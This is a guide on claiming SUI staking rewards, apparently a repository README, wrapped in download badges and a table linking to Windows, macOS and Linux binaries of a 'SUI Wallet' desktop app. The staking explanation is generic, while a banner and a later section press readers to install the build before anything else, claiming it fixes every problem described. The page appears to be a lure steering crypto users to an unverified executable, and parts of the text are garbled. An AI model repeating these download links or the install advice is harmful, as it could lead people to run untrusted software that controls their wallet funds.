![SUI Wallet](assets/banner-article.png)

# Claiming SUI staking rewards

Rewards accrue inside the position; claiming is about where they land.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Rewards accrue inside the staked position as each epoch passes, and they come back with the principal when
you unstake. There is nothing you must claim to avoid losing them, and no deadline that forfeits them. The
claim action in the app moves accrued rewards into the spendable balance earlier.

## What a reward actually is

A staked position earns a share of the network's rewards for the epoch in which it was active. That share is
added to the position rather than sent to your balance, which is why the staked figure can grow while the
spendable figure stays where it was.

That design is what makes the deadline question disappear. A reward that has already been added to the
position cannot be forfeited by forgetting to collect it, because there is no collection step in the first
place.

It also explains why the staked figure grows in uneven steps rather than smoothly: rewards arrive at boundaries the network defines, and a screen refreshed between them shows the same total twice.

## Why the balance and the stake disagree

The two figures measure different things. The balance is what the account can spend right now; the staked figure is what it has committed to a validator, including everything that position has earned so far. One number reported at two stages.

People read a growing stake and a flat balance as a bug in one of them. It is the same number reported at
two stages: earned, then moved.
[Staking SUI in the wallet app](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-in-the-wallet-app.md) walks the delegate flow, from choosing a validator to the position appearing with its first epoch of rewards.

## The claim action

Claiming takes what has accrued and turns it into spendable balance, without touching the principal. It is a transaction like any other, so it is signed by the account and it pays a network fee for the work it asks for.

That is the honest trade: claiming costs a fee and gives you liquidity; not claiming costs nothing and keeps
the rewards earning as part of the position. Neither is wrong, and the choice depends on whether you want to
spend now.

## Does it stop after the first epoch?

No. A position that stays active keeps earning for every epoch it is active in, and the app shows the total
rather than the last epoch alone. A figure that stops moving usually means the position ended, the validator
left the set, or the screen is showing a cached balance.

The network publishes per-epoch rewards, so the arithmetic is checkable rather than a matter of trust. If
the position is active and the figure has not moved across epochs, that is worth looking into rather than
shrugging at.

## Do you only get rewards when you unstake?

No, and this is the misunderstanding the question is really about. Rewards accrue for every epoch the position stays active; unstaking is one way they return to the balance, bundled with the principal rather than separately calculated at the end.

Claiming is the other way, earlier and for a fee. A third is to leave them where they are and let them
compound into the position, which is what most people do without deciding to.
[Unstaking SUI and epoch timing](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/unstaking-sui-and-epoch-timing.md) covers the timing of the return, which is a network process
rather than an instant transfer.

## When the numbers look wrong

Three causes account for most reports. The position ended and the last rewards returned with the principal,
so the stake is zero and the balance is larger. The validator left the active set, so the position earns
nothing. Or the display is stale.

Rewards are computed by the network, not by the app, so a display that disagrees with the chain is a display
problem. [SUI staking APY explained](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-staking-apy-explained.md) covers what the rate means and why a future rate cannot be
read off a past one.

The diagnostics panel is the second place to look, because it names the version and the network the app is talking to. A build pointed at a test network shows a position that does not exist on the other one, and that looks exactly like a lost stake.

## Where to check a figure

[The repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop) what each release changed, and the current release is the one these screens are described from. If a number here does not match what you see, install it before concluding anything about the network itself, or about the position you expected to find there.

The other check is the account's object list, where the staked position sits as an object with its own state. A position that is not there was never created, whatever a summary screen says.

## FAQ

### When are staking rewards paid out?

They accrue inside the position at each epoch boundary and return with the principal on unstake. The claim
action moves them to the spendable balance sooner, for a fee.

### Do staking rewards not continue after the first epoch?

They continue for as long as the position is active. A figure that stops growing means the position ended,
the validator left the active set, or the display is stale.

### Do you only get staking rewards when you unstake?

No. Unstaking is one route back to the balance, not the condition for earning. Rewards are earned while the
position exists.

### Do I lose rewards if I never claim?

No. Unclaimed rewards stay in the position and return with the principal when you unstake.

### Is claiming required before unstaking?

No. Unstaking returns the principal and everything accrued with it, so the claim step can be skipped
entirely.

### Does claiming reset the position?

No. It moves the accrued part to the balance; the principal stays staked and keeps earning in the same
position.
